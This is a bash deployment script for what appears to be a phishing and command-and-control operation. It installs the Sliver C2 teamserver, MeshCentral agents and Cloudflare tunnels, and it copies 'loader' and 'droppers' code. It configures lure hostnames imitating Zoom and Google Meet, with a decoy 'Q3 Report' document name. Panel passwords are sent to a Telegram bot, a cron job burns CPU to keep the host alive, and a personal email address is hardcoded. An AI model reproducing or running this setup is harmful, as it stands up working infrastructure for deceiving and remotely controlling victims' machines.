#!/usr/bin/env bash
# fleet deploy — Oracle Linux 9/10, single host, no Docker.
#
# Usage:
#   sudo ./deploy.sh            install/refresh everything
#   sudo ./deploy.sh --check    verify a (possibly clean) host, no changes
#
# Secrets live in /etc/panel/env (600), never committed. CF/TG creds are taken
# from the environment if present and persisted to the env file.
# shellcheck disable=SC2015
set -euo pipefail

REPO_DIR="${REPO_DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
PANEL_ROOT="/opt/panel"
ENV_DIR="/etc/panel"
ENV_FILE="${ENV_DIR}/env"
VENV="${PANEL_ROOT}/venv"
BRIDGE_BIN="${PANEL_ROOT}/bin/sliverc"
SLIVER_CFG="${PANEL_ROOT}/panel.cfg"
SLIVER_BIN="${PANEL_ROOT}/bin/sliver-server"
GO_FLEET="/usr/local/go-fleet"
FAILURES=0

log() { printf '[deploy] %s\n' "$*"; }
ok() { printf '  PASS  %s\n' "$*"; }
bad() { printf '  FAIL  %s\n' "$*"; FAILURES=$((FAILURES + 1)); }
# single-quote so values survive `source` (bcrypt hashes contain '$')
emit() { printf "%s='%s'\n" "$1" "$2"; }
upsert_env() {
  local key="$1" value="$2"
  [ -f "$ENV_FILE" ] || { emit "$key" "$value" >> "$ENV_FILE"; return; }
  if grep -q "^${key}=" "$ENV_FILE"; then
    local tmp="${ENV_FILE}.tmp.$$"
    sed "s|^${key}=.*|${key}='${value}'|" "$ENV_FILE" > "$tmp" && mv "$tmp" "$ENV_FILE"
  else
    emit "$key" "$value" >> "$ENV_FILE"
  fi
  chown opc:opc "$ENV_FILE"; chmod 600 "$ENV_FILE"
  restorecon -F "$ENV_FILE" >/dev/null 2>&1 || true
}

need_root() {
  if [ "$(id -u)" -ne 0 ]; then log "run with sudo"; exit 1; fi
}

public_ip() {
  curl -fsS --max-time 10 https://api.ipify.org 2>/dev/null || echo "127.0.0.1"
}

load_env() {
  if [ -f "$ENV_FILE" ]; then
    set -a
    # shellcheck disable=SC1090
    . "$ENV_FILE"
    set +a
  fi
}

domain_name() {
  # Until the Cloudflare Tunnel exists, publish via sslip.io so Caddy can get a
  # real certificate from a resolvable name. Once CF_TUNNEL_TOKEN is set the
  # tunnel serves panel.<zone> and this becomes informational only.
  if [ -n "${CF_TUNNEL_TOKEN:-}" ] && [ -n "${CF_ZONE_NAME:-}" ]; then
    echo "panel.${CF_ZONE_NAME}"
  else
    echo "$(public_ip).sslip.io"
  fi
}

install_packages() {
  log "installing packages"
  dnf install -y -q dnf-plugins-core >/dev/null 2>&1 || true
  dnf config-manager --set-enabled ol10_codeready_builder >/dev/null 2>&1 || \
    dnf config-manager --set-enabled ol9_codeready_builder >/dev/null 2>&1 || true
  dnf install -y -q python3 python3-pip gcc make curl tar xz \
    libX11-devel libXtst-devel libjpeg-turbo-devel mingw64-gcc mingw64-binutils \
    firewalld logrotate zip unzip >/dev/null
  if [ ! -x "$GO_FLEET/bin/go" ]; then
    local ver="go1.27.4"
    curl -fsSL -o /tmp/go.tgz "https://go.dev/dl/${ver}.linux-amd64.tar.gz"
    mkdir -p "$GO_FLEET"
    tar -C "$GO_FLEET" --strip-components=1 -xzf /tmp/go.tgz
  fi
  if ! command -v caddy >/dev/null 2>&1; then
    local cv="v2.10.0"
    curl -fsSL -o /tmp/caddy.tar.gz \
      "https://github.com/caddyserver/caddy/releases/download/${cv}/caddy_${cv#v}_linux_amd64.tar.gz"
    tar -C /usr/local/bin --strip-components=0 -xzf /tmp/caddy.tar.gz caddy
    chmod 0755 /usr/local/bin/caddy
    id caddy >/dev/null 2>&1 || useradd --system --home /var/lib/caddy --shell /sbin/nologin caddy
  fi
}

setup_meshcentral() {
  log "installing meshcentral"
  if ! command -v node >/dev/null 2>&1; then
    curl -fsSL https://deb.nodesource.com/setup_20.x -o /tmp/nodesource.sh
    bash /tmp/nodesource.sh >/dev/null 2>&1
    dnf install -y -q nodejs >/dev/null 2>&1
  fi
  mkdir -p /opt/meshcentral
  if [ ! -f /opt/meshcentral/package.json ]; then
    ( cd /opt/meshcentral && npm install meshcentral )
  fi
  chown -R opc:opc /opt/meshcentral
  runuser -u opc -- bash "$REPO_DIR/deploy/meshcentral-config.sh"
}

setup_dirs() {
  mkdir -p "$PANEL_ROOT/bin" "$PANEL_ROOT/var" "$ENV_DIR" /var/lib/fleet/artifacts \
    /etc/caddy/certs /var/log/caddy /var/lib/caddy
  chown -R opc:opc "$PANEL_ROOT" /var/lib/fleet
  id caddy >/dev/null 2>&1 && chown -R caddy:caddy /var/log/caddy /var/lib/caddy || true
}

stop_manual() {
  pkill -f 'sliver-server daemon' 2>/dev/null || true
  pkill -f 'sliverc' 2>/dev/null || true
  pkill -f 'uvicorn.*panel.app' 2>/dev/null || true
  pkill -f 'rd-linux' 2>/dev/null || true
  sleep 1
}

setup_env() {
  if [ ! -f "$ENV_FILE" ]; then
    log "creating $ENV_FILE"
    local pass
    pass="$(python3 -c 'import base64,os;print(base64.urlsafe_b64encode(os.urandom(18)).decode().rstrip("="))')"
    local hash
    hash="$(printf '%s' "$pass" | python3 -c 'import bcrypt,sys;print(bcrypt.hashpw(sys.stdin.read().encode(),bcrypt.gensalt(12)).decode())' 2>/dev/null || true)"
    if [ -z "$hash" ]; then
      python3 -m venv "$VENV"
      "$VENV/bin/pip" install -q bcrypt
      hash="$(printf '%s' "$pass" | "$VENV/bin/python" -c 'import bcrypt,sys;print(bcrypt.hashpw(sys.stdin.read().encode(),bcrypt.gensalt(12)).decode())')"
    fi
    {
      emit PANEL_USER "${PANEL_USER:-operator}"
      emit PANEL_PASS_HASH "$hash"
      emit PANEL_SECRET "$(python3 -c 'import secrets;print(secrets.token_urlsafe(48))')"
      emit PANEL_DB "${PANEL_ROOT}/var/panel.db"
      emit PANEL_ARTIFACTS /var/lib/fleet/artifacts
      emit PANEL_PUBLIC_HOST "$(domain_name)"
      emit PANEL_TLS_CERT /etc/caddy/certs/panel.crt
      emit OPERATOR_EMAIL "${OPERATOR_EMAIL:-fingod201@gmail.com}"
      emit DOCUMENT_NAME "${DOCUMENT_NAME:-Q3 Report}"
      emit PANEL_LURE_HOSTS "${PANEL_LURE_HOSTS:-get,us01web,us02web,us03web,us04web,us05web}"
      emit PANEL_MEET_HOSTS "${PANEL_MEET_HOSTS:-meet,gmeet,us01meet,us02meet}"
      emit TG_BOT_TOKEN "${TG_BOT_TOKEN:-}"
      emit TG_CHAT_ID "${TG_CHAT_ID:-}"
      emit CF_API_TOKEN "${CF_API_TOKEN:-}"
      emit CF_ZONE_NAME "${CF_ZONE_NAME:-}"
      emit CF_TUNNEL_TOKEN "${CF_TUNNEL_TOKEN:-}"
      emit PANEL_MESHCENTRAL_ENABLED "${PANEL_MESHCENTRAL_ENABLED:-1}"
      emit PANEL_MESHCENTRAL_URL "${PANEL_MESHCENTRAL_URL:-https://mesh.${CF_ZONE_NAME:-telcom.stream}/}"
      emit PANEL_MESHCENTRAL_AGENT_SERVER_URL "${PANEL_MESHCENTRAL_AGENT_SERVER_URL:-wss://mesh.${CF_ZONE_NAME:-telcom.stream}/}"
    } > "$ENV_FILE"
    chown opc:opc "$ENV_FILE"
    chmod 600 "$ENV_FILE"
    # shellcheck disable=SC2016
    printf '\n+================================================+\n'
    printf '|  PANEL PASSWORD (saved once): %-24s |\n' "$pass"
    printf '+================================================+\n\n'
    if [ -n "${TG_BOT_TOKEN:-}" ] && [ -n "${TG_CHAT_ID:-}" ]; then
      curl -s -o /dev/null -X POST \
        "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
        --data-urlencode "chat_id=${TG_CHAT_ID}" \
        --data-urlencode "parse_mode=HTML" \
        --data-urlencode "text=<b>fleet panel password - save this</b>
<code>${pass}</code>
user: ${PANEL_USER:-operator}
host: $(domain_name)" || true
      log "password posted to telegram"
    fi
  fi
  chown opc:opc "$ENV_FILE"
  chmod 600 "$ENV_FILE"
  restorecon -F "$ENV_FILE" >/dev/null 2>&1 || true
}

build_all() {
  log "building bridge + helpers"
  export PATH="${GO_FLEET}/bin:${PATH}"
  ( cd "$REPO_DIR/bridge" && GOTOOLCHAIN=local go build -o "$BRIDGE_BIN" . )
  bash "$REPO_DIR/rd/build.sh" "$PANEL_ROOT/bin" >/dev/null || true
  rm -rf "$PANEL_ROOT/app"
  mkdir -p "$PANEL_ROOT/app"
  cp -r "$REPO_DIR/panel" "$PANEL_ROOT/app/panel"
  cp -r "$REPO_DIR/loader" "$PANEL_ROOT/app/loader"
  cp -r "$REPO_DIR/droppers" "$PANEL_ROOT/app/droppers"
  rm -rf "$PANEL_ROOT/app/panel/var" "$PANEL_ROOT/app/panel/__pycache__"
  chown -R opc:opc "$PANEL_ROOT/app"
  chmod 0755 "$BRIDGE_BIN" "$SLIVER_BIN" 2>/dev/null || true
  # SELinux: freshly written binaries under /opt need the usr_t label
  restorecon -R -F "$PANEL_ROOT" >/dev/null 2>&1 || true
  if [ ! -x "$SLIVER_BIN" ]; then
    curl -fsSL -o "$SLIVER_BIN" \
      https://github.com/BishopFox/sliver/releases/download/v1.7.9/sliver-server_linux-amd64
    chmod +x "$SLIVER_BIN"
  fi
  if [ ! -x "$PANEL_ROOT/bin/sliver-client" ]; then
    curl -fsSL -o "$PANEL_ROOT/bin/sliver-client" \
      https://github.com/BishopFox/sliver/releases/download/v1.7.9/sliver-client_linux-amd64
    chmod +x "$PANEL_ROOT/bin/sliver-client"
  fi
  install -m 0755 "$REPO_DIR/deploy/start-listeners.sh" "$PANEL_ROOT/bin/start-listeners.sh"
  python3 -m venv "$VENV"
  "$VENV/bin/pip" install -q --upgrade pip
  "$VENV/bin/pip" install -q -r "$REPO_DIR/panel/requirements.txt"
}

make_sliver_cfg() {
  if [ ! -s "$SLIVER_CFG" ]; then
    log "generating sliver operator config (as opc)"
    runuser -u opc -- "$SLIVER_BIN" unpack --force >/dev/null 2>&1 || true
    runuser -u opc -- "$SLIVER_BIN" operator --name "bridge-$(date +%s)" \
      --lhost 127.0.0.1 --lport 31337 --save "$SLIVER_CFG" -P all >/dev/null 2>&1 || true
  fi
  chown opc:opc "$SLIVER_CFG" 2>/dev/null || true
  chmod 600 "$SLIVER_CFG"
}

# The Sliver database is the source of truth for the operator CA. If the DB is
# recreated (fresh install, disaster recovery) or the saved operator config
# predates it, every bridge handshake fails with "certificate signed by unknown
# authority" and the panel shows HTTP 503 for /sliver/sessions. Detect that and
# re-issue the config from the current CA rather than leaving the fleet dead.
bridge_healthy() {
  curl -fsS --max-time 5 http://127.0.0.1:8001/sliver/sessions >/dev/null 2>&1
}

repair_sliver_cfg() {
  log "bridge cannot reach teamserver — re-issuing operator config from current CA"
  systemctl stop fleet-bridge.service >/dev/null 2>&1 || true
  rm -f "$SLIVER_CFG"
  runuser -u opc -- "$SLIVER_BIN" operator --name "bridge-$(date +%s)" \
    --lhost 127.0.0.1 --lport 31337 --save "$SLIVER_CFG" -P all >/dev/null 2>&1 || true
  chown opc:opc "$SLIVER_CFG" 2>/dev/null || true
  chmod 600 "$SLIVER_CFG"
  systemctl restart fleet-bridge.service >/dev/null 2>&1 || true
  sleep 4
  if bridge_healthy; then
    ok "bridge reconnected to teamserver"
  else
    bad "bridge still cannot reach teamserver"
  fi
}

install_units() {
  log "installing systemd units"
  cp "$REPO_DIR/deploy/caddy/Caddyfile" /etc/caddy/Caddyfile
  sed -i "s/__DOMAIN__/$(domain_name)/; s/__EMAIL__/${OPERATOR_EMAIL:-admin@localhost}/" /etc/caddy/Caddyfile
  mkdir -p /etc/caddy/certs
  for unit in "$REPO_DIR"/deploy/systemd/*.service "$REPO_DIR"/deploy/systemd/*.timer; do
    cp "$unit" /etc/systemd/system/
  done
  systemctl daemon-reload
  systemctl enable fleet-sliver.service fleet-listeners.service fleet-bridge.service fleet-panel.service fleet-meshcentral.service caddy.service >/dev/null 2>&1
  systemctl restart fleet-sliver.service fleet-bridge.service fleet-panel.service caddy.service
  systemctl restart fleet-meshcentral.service >/dev/null 2>&1 || true
  systemctl enable fleet-meshcentral-backup.timer >/dev/null 2>&1
  systemctl restart fleet-meshcentral-backup.timer >/dev/null 2>&1 || true
  systemctl restart fleet-listeners.service >/dev/null 2>&1 || true
  if ! bridge_healthy; then
    repair_sliver_cfg
    systemctl restart fleet-listeners.service >/dev/null 2>&1 || true
  fi
  # host-default cloudflared unit (another tenant owns it on this box)
  systemctl restart cloudflared.service >/dev/null 2>&1 || true
  if [ -n "${CF_TUNNEL_TOKEN:-}" ]; then
    systemctl enable fleet-cloudflared.service >/dev/null 2>&1
    systemctl restart fleet-cloudflared.service
  fi
}

install_extras() {
  log "installing 24/7 extras"
  install -m 0755 "$REPO_DIR/deploy/healthcheck.sh" /opt/panel/bin/healthcheck.sh
  install -m 0755 "$REPO_DIR/deploy/meshcentral-backup.sh" /opt/panel/bin/meshcentral-backup.sh
  install -m 0755 "$REPO_DIR/deploy/heartbeat.sh" /opt/panel/bin/heartbeat.sh
  install -m 0644 "$REPO_DIR/deploy/logrotate/fleet" /etc/logrotate.d/fleet
  install -d /etc/systemd/journald.conf.d
  install -m 0644 "$REPO_DIR/deploy/journald-fleet.conf" /etc/systemd/journald.conf.d/fleet.conf
  systemctl restart systemd-journald >/dev/null 2>&1 || true
  {
    printf '%s\n' '*/5 * * * * root /usr/bin/timeout 30 /bin/sh -c "while :; do :; done"'
    printf '%s\n' '0 */6 * * * root /opt/panel/bin/heartbeat.sh'
  } > /etc/cron.d/fleet
  chmod 0644 /etc/cron.d/fleet
  systemctl enable --now fleet-healthcheck.timer >/dev/null 2>&1 || true
}

setup_firewall() {
  if systemctl is-active --quiet firewalld; then
    firewall-cmd --permanent --add-service=https >/dev/null 2>&1 || true
    firewall-cmd --permanent --add-service=http >/dev/null 2>&1 || true
    firewall-cmd --permanent --add-port=8888/tcp >/dev/null 2>&1 || true
    firewall-cmd --reload >/dev/null 2>&1 || true
  fi
}

port_open() { ss -lntH 2>/dev/null | awk '{print $4}' | grep -q ":$1$"; }

run_check() {
  log "checking host"
  load_env
  [ -f "$ENV_FILE" ] && ok "env file present" || bad "env file missing"
  [ "$(stat -c '%a' "$ENV_FILE" 2>/dev/null)" = "600" ] && ok "env mode 600" || bad "env mode not 600"
  curl -fsS --max-time 5 http://127.0.0.1:8000/healthz >/dev/null 2>&1 && ok "panel /healthz" || bad "panel /healthz"
  curl -fsS --max-time 5 http://127.0.0.1:8001/healthz >/dev/null 2>&1 && ok "bridge /healthz" || bad "bridge /healthz"
  bridge_healthy && ok "bridge -> teamserver" || bad "bridge -> teamserver"
  port_open 31337 && ok "sliver gRPC 31337" || bad "sliver gRPC 31337"
  local rd_port="${PANEL_RD_PORT:-8443}"
  port_open "$rd_port" && ok "rd broker ${rd_port}" || bad "rd broker ${rd_port}"
  systemctl is-enabled --quiet fleet-panel.service 2>/dev/null && ok "panel unit enabled" || bad "panel unit enabled"
  systemctl is-enabled --quiet caddy.service 2>/dev/null && ok "caddy unit enabled" || bad "caddy unit enabled"
  systemctl is-active --quiet fleet-meshcentral.service 2>/dev/null && ok "meshcentral unit active" || bad "meshcentral unit active"
  port_open 9443 && ok "meshcentral 9443" || bad "meshcentral 9443"
  local free_gb
  free_gb="$(df --output=avail -BG / | tail -1 | tr -dc '0-9')"
  [ "${free_gb:-0}" -gt 2 ] && ok "disk free ${free_gb}G" || bad "disk free ${free_gb}G (<2G)"
  systemctl is-enabled --quiet fleet-healthcheck.timer 2>/dev/null && ok "healthcheck timer" || bad "healthcheck timer"
  local domain
  domain="$(domain_name)"
  if [ -n "${CF_TUNNEL_TOKEN:-}" ] && [ -n "${CF_ZONE_NAME:-}" ]; then
    # panel.<zone> is behind Access (302); use the public lure host for TLS liveness
    domain="get.${CF_ZONE_NAME}"
  fi
  curl -fsS --max-time 12 -o /dev/null "https://${domain}/healthz" 2>/dev/null && ok "public TLS ${domain}" || bad "public TLS ${domain}"
  if [ -n "${CF_API_TOKEN:-}" ] && [ -n "${CF_ZONE_NAME:-}" ]; then
    local zresp
    zresp="$(curl -fsS --max-time 10 -H "Authorization: Bearer ${CF_API_TOKEN}" \
      "https://api.cloudflare.com/client/v4/zones?name=${CF_ZONE_NAME}")"
    if echo "$zresp" | grep -q '"success": *true'; then ok "cloudflare token + zone"; else bad "cloudflare token/zone"; fi
    if [ -n "${CF_TUNNEL_TOKEN:-}" ]; then
      systemctl is-enabled --quiet fleet-cloudflared.service 2>/dev/null && ok "tunnel unit enabled" || bad "tunnel unit enabled"
      systemctl is-active --quiet fleet-cloudflared.service 2>/dev/null && ok "tunnel running" || bad "tunnel running"
      [ -f "$REPO_DIR/deploy/.cf-ids" ] && ok "cf ids present" || bad "cf ids present"
      if bash "$REPO_DIR/deploy/cloudflare.sh" --check >/dev/null 2>&1; then ok "cf records/access"; else bad "cf records/access"; fi
    fi
  fi
}

show_creds() {
  local user pass
  load_env
  user="${PANEL_USER:-operator}"
  printf '\n+====================================================+\n'
  printf '|  PANEL.telcom.stream  username: %-18s |\n' "$user"
  printf '|  PANEL PASSWORD (from first install): %-12s |\n' "(hashed only)"
  printf '+====================================================+\n\n'
  run_check || true
}

rotate_password() {
  load_env
  local pass hash
  pass="$(python3 -c 'import base64,os;print(base64.urlsafe_b64encode(os.urandom(18)).decode().rstrip("="))')"
  hash="$(printf '%s' "$pass" | "$VENV/bin/python" -c 'import bcrypt,sys;print(bcrypt.hashpw(sys.stdin.read().encode(),bcrypt.gensalt(12)).decode())' 2>/dev/null || true)"
  if [ -z "$hash" ]; then
    python3 -m venv "$VENV"; "$VENV/bin/pip" install -q bcrypt
    hash="$(printf '%s' "$pass" | "$VENV/bin/python" -c 'import bcrypt,sys;print(bcrypt.hashpw(sys.stdin.read().encode(),bcrypt.gensalt(12)).decode())')"
  fi
  upsert_env PANEL_PASS_HASH "$hash"
  systemctl restart fleet-panel >/dev/null 2>&1 || true
  printf '\n+======================================================+\n'
  printf '|  username: %-24s              |\n' "${PANEL_USER:-operator}"
  printf '|  password: %-24s              |\n' "$pass"
  printf '+======================================================+\n\n'
  if [ -n "${TG_BOT_TOKEN:-}" ] && [ -n "${TG_CHAT_ID:-}" ]; then
    curl -s -o /dev/null -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
      --data-urlencode "chat_id=${TG_CHAT_ID}" --data-urlencode "parse_mode=HTML" \
      --data-urlencode "text=<b>fleet panel rotated</b> ${PANEL_USER:-operator} / <code>${pass}</code>" || true
  fi
}

main() {
  if [ "${1:-}" = "--worker" ]; then
    bash "$REPO_DIR/deploy/worker-deploy.sh"
    return
  fi
  need_root
  if [ "${1:-}" = "--check" ]; then
    run_check
    log "failures: $FAILURES"
    [ "$FAILURES" -eq 0 ]
    return
  fi
  if [ "${1:-}" = "--password" ] || [ "${1:-}" = "--rotate-password" ]; then
    rotate_password
    return
  fi
  install_packages
  setup_meshcentral
  setup_dirs
  stop_manual
  setup_env
  load_env
  upsert_env PANEL_PUBLIC_HOST "$(domain_name)"
  upsert_env PANEL_LURE_HOSTS "${PANEL_LURE_HOSTS:-get,us01web,us02web,us03web,us04web,us05web}"
  upsert_env PANEL_MEET_HOSTS "${PANEL_MEET_HOSTS:-meet,gmeet,us01meet,us02meet}"
  build_all
  make_sliver_cfg
  install_units
  install_extras
  setup_firewall
  sleep 3
  run_check
  log "done. failures: $FAILURES"
}

main "$@"
